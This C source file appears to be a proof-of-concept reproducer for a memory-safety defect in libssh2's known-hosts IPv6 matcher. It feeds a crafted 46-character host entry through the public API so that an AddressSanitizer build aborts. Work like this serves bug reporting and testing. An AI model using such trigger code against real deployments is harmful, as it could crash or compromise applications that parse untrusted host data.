/* Proof-of-concept driver for a memory-safety defect in libssh2's
 * known-hosts IPv6 matcher, reached entirely through the public API.
 *
 * An application loads a known-hosts entry with libssh2_knownhost_readline()
 * and later asks libssh2_knownhost_check() to compare a host against the
 * stored collection.  Both the stored host field and the queried host are
 * attacker-influenced in realistic deployments (e.g. a known_hosts file of
 * unknown provenance, or a hostname derived from an untrusted URL).
 *
 * When the resulting tree is built with AddressSanitizer this program aborts
 * (SIGABRT) while libssh2 parses the crafted host field.  It exits cleanly on
 * the original batch.
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    char line[128];
    size_t pos;
    int rc;
    struct libssh2_knownhost *store = NULL;
    static const char key[] = "ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAAAgQDexampleexampleexampleexample";

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "session_init failed\n");
        return 2;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "knownhost_init failed\n");
        return 2;
    }

    /* Build a plain known-hosts entry whose host field is exactly 46
     * characters long, followed by a normal ssh-rsa key.  46 is one past the
     * longest textual IPv6 literal (45), so the matcher accepts it but never
     * stores it successfully. */
    pos = 0;
    while(pos < 46)
        line[pos++] = 'a';
    line[pos++] = ' ';
    memcpy(line + pos, key, sizeof(key) - 1);
    pos += sizeof(key) - 1;
    line[pos] = '\0';

    rc = libssh2_knownhost_readline(hosts, line, pos,
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "readline failed: %d\n", rc);
        return 2;
    }

    /* Query with a short, non-equal host so the comparison reaches the IPv6
     * matcher for the 46-character stored entry. */
    rc = libssh2_knownhost_check(hosts, "b",
                                 "ssh-rsa AAAAB3NzaC1yc2E", 23,
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_RAW |
                                 LIBSSH2_KNOWNHOST_KEY_SSHRSA,
                                 &store);

    printf("check returned %d (no sanitizer abort on this tree)\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
